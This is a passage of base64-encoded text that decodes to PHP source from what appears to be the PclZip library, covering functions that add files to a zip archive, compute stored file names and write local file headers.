gJHBfaGVhZGVyWyd2ZXJzaW9uJ10gPSAyMDsNCiAgJHBfaGVhZGVyWyd2ZXJzaW9uX2V4dHJhY3RlZCddID0gMTA7DQogICRwX2hlYWRlclsnZmxhZyddID0gMDsNCiAgJHBfaGVhZGVyWydjb21wcmVzc2lvbiddID0gMDsNCiAgJHBfaGVhZGVyWydjcmMnXSA9IDA7DQogICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10gPSAwOw0KICAkcF9oZWFkZXJbJ2ZpbGVuYW1lX2xlbiddID0gc3RybGVuKCRwX2ZpbGVuYW1lKTsNCiAgJHBfaGVhZGVyWydleHRyYV9sZW4nXSA9IDA7DQogICRwX2hlYWRlclsnZGlzayddID0gMDsNCiAgJHBfaGVhZGVyWydpbnRlcm5hbCddID0gMDsNCiAgJHBfaGVhZGVyWydvZmZzZXQnXSA9IDA7DQogICRwX2hlYWRlclsnZmlsZW5hbWUnXSA9ICRwX2ZpbGVuYW1lOw0KICAkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddID0gJHBfZmlsZWRlc2NyWydzdG9yZWRfZmlsZW5hbWUnXTsNCiAgJHBfaGVhZGVyWydleHRyYSddID0gJyc7DQogICRwX2hlYWRlclsnc3RhdHVzJ10gPSAnb2snOw0KICAkcF9oZWFkZXJbJ2luZGV4J10gPSAtMTsNCg0KICBpZiAoJHBfZmlsZWRlc2NyWyd0eXBlJ109PSdmaWxlJykgew0KICAgICRwX2hlYWRlclsnZXh0ZXJuYWwnXSA9IDB4MDAwMDAwMDA7DQogICAgJHBfaGVhZGVyWydzaXplJ10gPSBmaWxlc2l6ZSgkcF9maWxlbmFtZSk7DQogIH0NCiAgDQogIGVsc2UgaWYgKCRwX2ZpbGVkZXNjclsndHlwZSddPT0nZm9sZGVyJykgew0KICAgICRwX2hlYWRlclsnZXh0ZXJuYWwnXSA9IDB4MDAwMDAwMTA7DQogICAgJHBfaGVhZGVyWydtdGltZSddID0gZmlsZW10aW1lKCRwX2ZpbGVuYW1lKTsNCiAgICAkcF9oZWFkZXJbJ3NpemUnXSA9IGZpbGVzaXplKCRwX2ZpbGVuYW1lKTsNCiAgfQ0KICANCiAgZWxzZSBpZiAoJHBfZmlsZWRlc2NyWyd0eXBlJ10gPT0gJ3ZpcnR1YWxfZmlsZScpIHsNCiAgICAkcF9oZWFkZXJbJ2V4dGVybmFsJ10gPSAweDAwMDAwMDAwOw0KICAgICRwX2hlYWRlclsnc2l6ZSddID0gc3RybGVuKCRwX2ZpbGVkZXNjclsnY29udGVudCddKTsNCiAgfQ0KICANCg0KICBpZiAoaXNzZXQoJHBfZmlsZWRlc2NyWydtdGltZSddKSkgew0KICAgICRwX2hlYWRlclsnbXRpbWUnXSA9ICRwX2ZpbGVkZXNjclsnbXRpbWUnXTsNCiAgfQ0KICBlbHNlIGlmICgkcF9maWxlZGVzY3JbJ3R5cGUnXSA9PSAndmlydHVhbF9maWxlJykgew0KICAgICRwX2hlYWRlclsnbXRpbWUnXSA9IHRpbWUoKTsNCiAgfQ0KICBlbHNlIHsNCiAgICAkcF9oZWFkZXJbJ210aW1lJ10gPSBmaWxlbXRpbWUoJHBfZmlsZW5hbWUpOw0KICB9DQoNCiAgaWYgKGlzc2V0KCRwX2ZpbGVkZXNjclsnY29tbWVudCddKSkgew0KICAgICRwX2hlYWRlclsnY29tbWVudF9sZW4nXSA9IHN0cmxlbigkcF9maWxlZGVzY3JbJ2NvbW1lbnQnXSk7DQogICAgJHBfaGVhZGVyWydjb21tZW50J10gPSAkcF9maWxlZGVzY3JbJ2NvbW1lbnQnXTsNCiAgfQ0KICBlbHNlIHsNCiAgICAkcF9oZWFkZXJbJ2NvbW1lbnRfbGVuJ10gPSAwOw0KICAgICRwX2hlYWRlclsnY29tbWVudCddID0gJyc7DQogIH0NCg0KICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUFJFX0FERF0pKSB7DQoNCiAgICAkdl9sb2NhbF9oZWFkZXIgPSBhcnJheSgpOw0KICAgICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkcF9oZWFkZXIsICR2X2xvY2FsX2hlYWRlcik7DQoNCiAgICAkdl9yZXN1bHQgPSAkcF9vcHRpb25zW1BDTFpJUF9DQl9QUkVfQUREXShQQ0xaSVBfQ0JfUFJFX0FERCwgJHZfbG9jYWxfaGVhZGVyKTsNCiAgICBpZiAoJHZfcmVzdWx0ID09IDApIHsNCiAgICAgICRwX2hlYWRlclsnc3RhdHVzJ10gPSAic2tpcHBlZCI7DQogICAgICAkdl9yZXN1bHQgPSAxOw0KICAgIH0NCg0KICAgIGlmICgkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddICE9ICR2X2xvY2FsX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10pIHsNCiAgICAgICRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10gPSBQY2xaaXBVdGlsUGF0aFJlZHVjdGlvbigkdl9sb2NhbF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddKTsNCiAgICB9DQogIH0NCg0KICBpZiAoJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSA9PSAiIikgew0KICAgICRwX2hlYWRlclsnc3RhdHVzJ10gPSAiZmlsdGVyZWQiOw0KICB9DQogIA0KICBpZiAoc3RybGVuKCRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10pID4gMHhGRikgew0KICAgICRwX2hlYWRlclsnc3RhdHVzJ10gPSAnZmlsZW5hbWVfdG9vX2xvbmcnOw0KICB9DQoNCiAgaWYgKCRwX2hlYWRlclsnc3RhdHVzJ10gPT0gJ29rJykgew0KDQogICAgaWYgKCRwX2ZpbGVkZXNjclsndHlwZSddID09ICdmaWxlJykgew0KICAgICAgaWYgKCAoIWlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGXSkpIA0KICAgICAgICAgICYmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfVEVNUF9GSUxFX09OXSkNCiAgICAgICAgICAgICAgfHwgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEXSkNCiAgICAgICAgICAgICAgICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRF0gPD0gJHBfaGVhZGVyWydzaXplJ10pKSApICkgew0KICAgICAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkFkZEZpbGVVc2luZ1RlbXBGaWxlKCRwX2ZpbGVkZXNjciwgJHBfaGVhZGVyLCAkcF9vcHRpb25zKTsNCiAgICAgICAgaWYgKCR2X3Jlc3VsdCA8IFBDTFpJUF9FUlJfTk9fRVJST1IpIHsNCiAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgICB9DQogICAgICB9DQogICAgICANCiAgICAgIGVsc2Ugew0KDQogICAgICBpZiAoKCR2X2ZpbGUgPSBAZm9wZW4oJHBfZmlsZW5hbWUsICJyYiIpKSA9PSAwKSB7DQogICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICJVbmFibGUgdG8gb3BlbiBmaWxlICckcF9maWxlbmFtZScgaW4gYmluYXJ5IHJlYWQgbW9kZSIpOw0KICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgIH0NCg0KICAgICAgJHZfY29udGVudCA9IEBmcmVhZCgkdl9maWxlLCAkcF9oZWFkZXJbJ3NpemUnXSk7DQoNCiAgICAgIEBmY2xvc2UoJHZfZmlsZSk7DQoNCiAgICAgICRwX2hlYWRlclsnY3JjJ10gPSBAY3JjMzIoJHZfY29udGVudCk7DQogICAgICANCiAgICAgIGlmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfTk9fQ09NUFJFU1NJT05dKSB7DQogICAgICAgICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10gPSAkcF9oZWFkZXJbJ3NpemUnXTsNCiAgICAgICAgJHBfaGVhZGVyWydjb21wcmVzc2lvbiddID0gMDsNCiAgICAgIH0NCiAgICAgIA0KICAgICAgZWxzZSB7DQogICAgICAgICR2X2NvbnRlbnQgPSBAZ3pkZWZsYXRlKCR2X2NvbnRlbnQpOw0KDQogICAgICAgICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10gPSBzdHJsZW4oJHZfY29udGVudCk7DQogICAgICAgICRwX2hlYWRlclsnY29tcHJlc3Npb24nXSA9IDg7DQogICAgICB9DQogICAgICANCiAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZXcml0ZUZpbGVIZWFkZXIoJHBfaGVhZGVyKSkgIT0gMSkgew0KICAgICAgICBAZmNsb3NlKCR2X2ZpbGUpOw0KICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgfQ0KDQogICAgICBAZndyaXRlKCR0aGlzLT56aXBfZmQsICR2X2NvbnRlbnQsICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10pOw0KDQogICAgICB9DQoNCiAgICB9DQoNCiAgICBlbHNlIGlmICgkcF9maWxlZGVzY3JbJ3R5cGUnXSA9PSAndmlydHVhbF9maWxlJykgew0KICAgICAgICANCiAgICAgICR2X2NvbnRlbnQgPSAkcF9maWxlZGVzY3JbJ2NvbnRlbnQnXTsNCg0KICAgICAgJHBfaGVhZGVyWydjcmMnXSA9IEBjcmMzMigkdl9jb250ZW50KTsNCiAgICAgIA0KICAgICAgaWYgKCRwX29wdGlvbnNbUENMWklQX09QVF9OT19DT01QUkVTU0lPTl0pIHsNCiAgICAgICAgJHBfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXSA9ICRwX2hlYWRlclsnc2l6ZSddOw0KICAgICAgICAkcF9oZWFkZXJbJ2NvbXByZXNzaW9uJ10gPSAwOw0KICAgICAgfQ0KICAgICAgDQogICAgICBlbHNlIHsNCiAgICAgICAgJHZfY29udGVudCA9IEBnemRlZmxhdGUoJHZfY29udGVudCk7DQoNCiAgICAgICAgJHBfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXSA9IHN0cmxlbigkdl9jb250ZW50KTsNCiAgICAgICAgJHBfaGVhZGVyWydjb21wcmVzc2lvbiddID0gODsNCiAgICAgIH0NCiAgICAgIA0KICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdldyaXRlRmlsZUhlYWRlcigkcF9oZWFkZXIpKSAhPSAxKSB7DQogICAgICAgIEBmY2xvc2UoJHZfZmlsZSk7DQogICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICB9DQoNCiAgICAgIEBmd3JpdGUoJHRoaXMtPnppcF9mZCwgJHZfY29udGVudCwgJHBfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXSk7DQogICAgfQ0KDQogICAgZWxzZSBpZiAoJHBfZmlsZWRlc2NyWyd0eXBlJ10gPT0gJ2ZvbGRlcicpIHsNCiAgICAgIGlmIChAc3Vic3RyKCRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10sIC0xKSAhPSAnLycpIHsNCiAgICAgICAgJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSAuPSAnLyc7DQogICAgICB9DQoNCiAgICAgICRwX2hlYWRlclsnc2l6ZSddID0gMDsNCg0KICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdldyaXRlRmlsZUhlYWRlcigkcF9oZWFkZXIpKSAhPSAxKQ0KICAgICAgew0KICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9DQl9QT1NUX0FERF0pKSB7DQoNCiAgICAkdl9sb2NhbF9oZWFkZXIgPSBhcnJheSgpOw0KICAgICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkcF9oZWFkZXIsICR2X2xvY2FsX2hlYWRlcik7DQoNCiAgICAkdl9yZXN1bHQgPSAkcF9vcHRpb25zW1BDTFpJUF9DQl9QT1NUX0FERF0oUENMWklQX0NCX1BPU1RfQURELCAkdl9sb2NhbF9oZWFkZXIpOw0KICAgIGlmICgkdl9yZXN1bHQgPT0gMCkgew0KICAgICAgJHZfcmVzdWx0ID0gMTsNCiAgICB9DQoNCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZBZGRGaWxlVXNpbmdUZW1wRmlsZSgkcF9maWxlZGVzY3IsICYkcF9oZWFkZXIsICYkcF9vcHRpb25zKQ0Kew0KICAkdl9yZXN1bHQ9UENMWklQX0VSUl9OT19FUlJPUjsNCiAgDQogICRwX2ZpbGVuYW1lID0gJHBfZmlsZWRlc2NyWydmaWxlbmFtZSddOw0KDQoNCiAgaWYgKCgkdl9maWxlID0gQGZvcGVuKCRwX2ZpbGVuYW1lLCAicmIiKSkgPT0gMCkgew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICJVbmFibGUgdG8gb3BlbiBmaWxlICckcF9maWxlbmFtZScgaW4gYmluYXJ5IHJlYWQgbW9kZSIpOw0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgJHZfZ3ppcF90ZW1wX25hbWUgPSBQQ0xaSVBfVEVNUE9SQVJZX0RJUi51bmlxaWQoJ3BjbHppcC0nKS4nLmd6JzsNCiAgaWYgKCgkdl9maWxlX2NvbXByZXNzZWQgPSBAZ3pvcGVuKCR2X2d6aXBfdGVtcF9uYW1lLCAid2IiKSkgPT0gMCkgew0KICAgIGZjbG9zZSgkdl9maWxlKTsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1dSSVRFX09QRU5fRkFJTCwgJ1VuYWJsZSB0byBvcGVuIHRlbXBvcmFyeSBmaWxlIFwnJy4kdl9nemlwX3RlbXBfbmFtZS4nXCcgaW4gYmluYXJ5IHdyaXRlIG1vZGUnKTsNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X3NpemUgPSBmaWxlc2l6ZSgkcF9maWxlbmFtZSk7DQogIHdoaWxlICgkdl9zaXplICE9IDApIHsNCiAgICAkdl9yZWFkX3NpemUgPSAoJHZfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkdl9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgJHZfYnVmZmVyID0gQGZyZWFkKCR2X2ZpbGUsICR2X3JlYWRfc2l6ZSk7DQogICAgQGd6cHV0cygkdl9maWxlX2NvbXByZXNzZWQsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAkdl9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgfQ0KDQogIEBmY2xvc2UoJHZfZmlsZSk7DQogIEBnemNsb3NlKCR2X2ZpbGVfY29tcHJlc3NlZCk7DQoNCiAgaWYgKGZpbGVzaXplKCR2X2d6aXBfdGVtcF9uYW1lKSA8IDE4KSB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9CQURfRk9STUFULCAnZ3ppcCB0ZW1wb3JhcnkgZmlsZSBcJycuJHZfZ3ppcF90ZW1wX25hbWUuJ1wnIGhhcyBpbnZhbGlkIGZpbGVzaXplIC0gc2hvdWxkIGJlIG1pbmltdW0gMTggYnl0ZXMnKTsNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogIGlmICgoJHZfZmlsZV9jb21wcmVzc2VkID0gQGZvcGVuKCR2X2d6aXBfdGVtcF9uYW1lLCAicmIiKSkgPT0gMCkgew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiB0ZW1wb3JhcnkgZmlsZSBcJycuJHZfZ3ppcF90ZW1wX25hbWUuJ1wnIGluIGJpbmFyeSByZWFkIG1vZGUnKTsNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X2JpbmFyeV9kYXRhID0gQGZyZWFkKCR2X2ZpbGVfY29tcHJlc3NlZCwgMTApOw0KICAkdl9kYXRhX2hlYWRlciA9IHVucGFjaygnYTFpZDEvYTFpZDIvYTFjbS9hMWZsYWcvVm10aW1lL2ExeGZsL2Exb3MnLCAkdl9iaW5hcnlfZGF0YSk7DQoNCiAgJHZfZGF0YV9oZWFkZXJbJ29zJ10gPSBiaW4yaGV4KCR2X2RhdGFfaGVhZGVyWydvcyddKTsNCg0KICBAZnNlZWsoJHZfZmlsZV9jb21wcmVzc2VkLCBmaWxlc2l6ZSgkdl9nemlwX3RlbXBfbmFtZSktOCk7DQogICR2X2JpbmFyeV9kYXRhID0gQGZyZWFkKCR2X2ZpbGVfY29tcHJlc3NlZCwgOCk7DQogICR2X2RhdGFfZm9vdGVyID0gdW5wYWNrKCdWY3JjL1Zjb21wcmVzc2VkX3NpemUnLCAkdl9iaW5hcnlfZGF0YSk7DQoNCiAgJHBfaGVhZGVyWydjb21wcmVzc2lvbiddID0gb3JkKCR2X2RhdGFfaGVhZGVyWydjbSddKTsNCiAgJHBfaGVhZGVyWydjcmMnXSA9ICR2X2RhdGFfZm9vdGVyWydjcmMnXTsNCiAgJHBfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXSA9IGZpbGVzaXplKCR2X2d6aXBfdGVtcF9uYW1lKS0xODsNCg0KICBAZmNsb3NlKCR2X2ZpbGVfY29tcHJlc3NlZCk7DQoNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdldyaXRlRmlsZUhlYWRlcigkcF9oZWFkZXIpKSAhPSAxKSB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIGlmICgoJHZfZmlsZV9jb21wcmVzc2VkID0gQGZvcGVuKCR2X2d6aXBfdGVtcF9uYW1lLCAicmIiKSkgPT0gMCkNCiAgew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiB0ZW1wb3JhcnkgZmlsZSBcJycuJHZfZ3ppcF90ZW1wX25hbWUuJ1wnIGluIGJpbmFyeSByZWFkIG1vZGUnKTsNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogIGZzZWVrKCR2X2ZpbGVfY29tcHJlc3NlZCwgMTApOw0KICAkdl9zaXplID0gJHBfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXTsNCiAgd2hpbGUgKCR2X3NpemUgIT0gMCkNCiAgew0KICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHZfZmlsZV9jb21wcmVzc2VkLCAkdl9yZWFkX3NpemUpOw0KICAgIEBmd3JpdGUoJHRoaXMtPnppcF9mZCwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICR2X3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICB9DQoNCiAgQGZjbG9zZSgkdl9maWxlX2NvbXByZXNzZWQpOw0KDQogIEB1bmxpbmsoJHZfZ3ppcF90ZW1wX25hbWUpOw0KICANCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkNhbGN1bGF0ZVN0b3JlZEZpbGVuYW1lKCYkcF9maWxlZGVzY3IsICYkcF9vcHRpb25zKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCiAgDQogICRwX2ZpbGVuYW1lID0gJHBfZmlsZWRlc2NyWydmaWxlbmFtZSddOw0KICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0FERF9QQVRIXSkpIHsNCiAgICAkcF9hZGRfZGlyID0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0FERF9QQVRIXTsNCiAgfQ0KICBlbHNlIHsNCiAgICAkcF9hZGRfZGlyID0gJyc7DQogIH0NCiAgaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfUEFUSF0pKSB7DQogICAgJHBfcmVtb3ZlX2RpciA9ICRwX29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfUEFUSF07DQogIH0NCiAgZWxzZSB7DQogICAgJHBfcmVtb3ZlX2RpciA9ICcnOw0KICB9DQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIXSkpIHsNCiAgICAkcF9yZW1vdmVfYWxsX2RpciA9ICRwX29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEhdOw0KICB9DQogIGVsc2Ugew0KICAgICRwX3JlbW92ZV9hbGxfZGlyID0gMDsNCiAgfQ0KDQoNCiAgaWYgKGlzc2V0KCRwX2ZpbGVkZXNjclsnbmV3X2Z1bGxfbmFtZSddKSkgew0KICAgICR2X3N0b3JlZF9maWxlbmFtZSA9IFBjbFppcFV0aWxUcmFuc2xhdGVXaW5QYXRoKCRwX2ZpbGVkZXNjclsnbmV3X2Z1bGxfbmFtZSddKTsNCiAgfQ0KICANCiAgZWxzZSB7DQoNCiAgICBpZiAoaXNzZXQoJHBfZmlsZWRlc2NyWyduZXdfc2hvcnRfbmFtZSddKSkgew0KICAgICAgJHZfcGF0aF9pbmZvID0gcGF0aGluZm8oJHBfZmlsZW5hbWUpOw0KICAgICAgJHZfZGlyID0gJyc7DQogICAgICBpZiAoJHZfcGF0aF9pbmZvWydkaXJuYW1lJ10gIT0gJycpIHsNCiAgICAgICAgJHZfZGlyID0gJHZfcGF0aF9pbmZvWydkaXJuYW1lJ10uJy8nOw0KICAgICAgfQ0KICAgICAgJHZfc3RvcmVkX2ZpbGVuYW1lID0gJHZfZGlyLiRwX2ZpbGVkZXNjclsnbmV3X3Nob3J0X25hbWUnXTsNCiAgICB9DQogICAgZWxzZSB7DQogICAgICAkdl9zdG9yZWRfZmlsZW5hbWUgPSAkcF9maWxlbmFtZTsNCiAgICB9DQoNCiAgICBpZiAoJHBfcmVtb3ZlX2FsbF9kaXIpIHsNCiAgICAgICR2X3N0b3JlZF9maWxlbmFtZSA9IGJhc2VuYW1lKCRwX2ZpbGVuYW1lKTsNCiAgICB9DQogICAgZWxzZSBpZiAoJHBfcmVtb3ZlX2RpciAhPSAiIikgew0KICAgICAgaWYgKHN1YnN0cigkcF9yZW1vdmVfZGlyLCAtMSkgIT0gJy8nKQ0KICAgICAgICAkcF9yZW1vdmVfZGlyIC49ICIvIjsNCg0KICAgICAgaWYgKCAgIChzdWJzdHIoJHBfZmlsZW5hbWUsIDAsIDIpID09ICIuLyIpDQogICAgICAgICAgfHwgKHN1YnN0cigkcF9yZW1vdmVfZGlyLCAwLCAyKSA9PSAiLi8iKSkgew0KICAgICAgICAgIA0KICAgICAgICBpZiAoICAgKHN1YnN0cigkcF9maWxlbmFtZSwgMCwgMikgPT0gIi4vIikNCiAgICAgICAgICAgICYmIChzdWJzdHIoJHBfcmVtb3ZlX2RpciwgMCwgMikgIT0gIi4vIikpIHsNCiAgICAgICAgICAkcF9yZW1vdmVfZGlyID0gIi4vIi4kcF9yZW1vdmVfZGlyOw0KICAgICAgICB9DQogICAgICAgIGlmICggICAoc3Vic3RyKCRwX2ZpbGVuYW1lLCAwLCAyKSAhPSAiLi8iKQ0KICAgICAgICAgICAgJiYgKHN1YnN0cigkcF9yZW1vdmVfZGlyLCAwLCAyKSA9PSAiLi8iKSkgew0KICAgICAgICAgICRwX3JlbW92ZV9kaXIgPSBzdWJzdHIoJHBfcmVtb3ZlX2RpciwgMik7DQogICAgICAgIH0NCiAgICAgIH0NCg0KICAgICAgJHZfY29tcGFyZSA9IFBjbFppcFV0aWxQYXRoSW5jbHVzaW9uKCRwX3JlbW92ZV9kaXIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZfc3RvcmVkX2ZpbGVuYW1lKTsNCiAgICAgIGlmICgkdl9jb21wYXJlID4gMCkgew0KICAgICAgICBpZiAoJHZfY29tcGFyZSA9PSAyKSB7DQogICAgICAgICAgJHZfc3RvcmVkX2ZpbGVuYW1lID0gIiI7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgJHZfc3RvcmVkX2ZpbGVuYW1lID0gc3Vic3RyKCR2X3N0b3JlZF9maWxlbmFtZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RybGVuKCRwX3JlbW92ZV9kaXIpKTsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCiAgICANCiAgICAkdl9zdG9yZWRfZmlsZW5hbWUgPSBQY2xaaXBVdGlsVHJhbnNsYXRlV2luUGF0aCgkdl9zdG9yZWRfZmlsZW5hbWUpOw0KICAgIA0KICAgIGlmICgkcF9hZGRfZGlyICE9ICIiKSB7DQogICAgICBpZiAoc3Vic3RyKCRwX2FkZF9kaXIsIC0xKSA9PSAiLyIpDQogICAgICAgICR2X3N0b3JlZF9maWxlbmFtZSA9ICRwX2FkZF9kaXIuJHZfc3RvcmVkX2ZpbGVuYW1lOw0KICAgICAgZWxzZQ0KICAgICAgICAkdl9zdG9yZWRfZmlsZW5hbWUgPSAkcF9hZGRfZGlyLiIvIi4kdl9zdG9yZWRfZmlsZW5hbWU7DQogICAgfQ0KICB9DQoNCiAgJHZfc3RvcmVkX2ZpbGVuYW1lID0gUGNsWmlwVXRpbFBhdGhSZWR1Y3Rpb24oJHZfc3RvcmVkX2ZpbGVuYW1lKTsNCiAgJHBfZmlsZWRlc2NyWydzdG9yZWRfZmlsZW5hbWUnXSA9ICR2X3N0b3JlZF9maWxlbmFtZTsNCiAgDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZXcml0ZUZpbGVIZWFkZXIoJiRwX2hlYWRlcikNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHBfaGVhZGVyWydvZmZzZXQnXSA9IGZ0ZWxsKCR0aGlzLT56aXBfZmQpOw0KDQogICR2X2RhdGUgPSBnZXRkYXRlKCRwX2hlYWRlclsnbXRpbWUnXSk7DQogICR2X210aW1lID0gKCR2X2RhdGVbJ2hvdXJzJ108PDExKSArICgkdl9kYXRlWydtaW51dGVzJ108PDUpICsgJHZfZGF0ZVsnc2Vjb25kcyddLzI7DQogICR2X21kYXRlID0gKCgkdl9kYXRlWyd5ZWFyJ10tMTk4MCk8PDkpICsgKCR2X2RhdGVbJ21vbiddPDw1KSArICR2X2RhdGVbJ21kYXknXTsNCg0KICAkdl9iaW5hcnlfZGF0YSA9IHBhY2soIlZ2dnZ2dlZWVnZ2IiwgMHgwNDAzNGI1MCwNCiAgICAgICAgICAgICAgICAgICAgICAkcF9oZWFkZXJbJ3ZlcnNpb25fZXh0cmFjdGVkJ10sICRwX2hlYWRlclsnZmxhZyddLA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBfaGVhZGVyWydjb21wcmVzc2lvbiddLCAkdl9tdGltZSwgJHZfbWRhdGUsDQogICAgICAgICAgICAgICAgICAgICAgICAkcF9oZWFkZXJbJ2NyYyddLCAkcF9oZWFkZXJbJ2NvbXByZXNzZWRfc2l6ZSddLA0KCQkJCQkgICRwX2hlYWRlclsnc2l6ZSddLA0KICAgICAgICAgICAgICAgICAgICAgICAgc3RybGVuKCRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10pLA0KCQkJCQkgICRwX2hlYWRlclsnZXh0cmFfbGVuJ10pOw0KDQogIGZwdXRzKCR0aGlzLT56aXBfZmQsICR2X2JpbmFyeV9kYXRhLCAzMCk7DQoNCiAgaWYgKHN0cmxlbigkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddKSAhPSAwKQ0KICB7DQogICAgZnB1dHMoJHRoaXMtPnppcF9mZCwgJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSwgc3RybGVuKCRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10pKTsNCiAgfQ0KICBpZiAoJHBfaGVhZGVyWydleHRyYV9sZW4nXSAhPSAwKQ0KICB7DQogICAgZnB1dHMoJHRoaXMtPnppcF9mZCwgJHBfaGVhZGVyWydleHRyYSddLCAkcF9oZWFkZXJbJ2V4dHJhX2xlbiddKTsNCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZXcml0ZUNlbnRyYWxGaWxlSGVhZGVyKCYkcF9oZWFkZXIpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR2X2RhdGUgPSBnZXRkYXRlKCRwX2hlYWRlclsnbXRpbWUnXSk7DQogICR2X210aW1lID0gKCR2X2RhdGVbJ2hvdXJzJ108PDExKSArICgkdl9kYXRlWydtaW51dGVzJ108PDUpICsgJHZfZGF0ZVsnc2Vjb25kcyddLzI7DQogICR2X21kYXRlID0gKC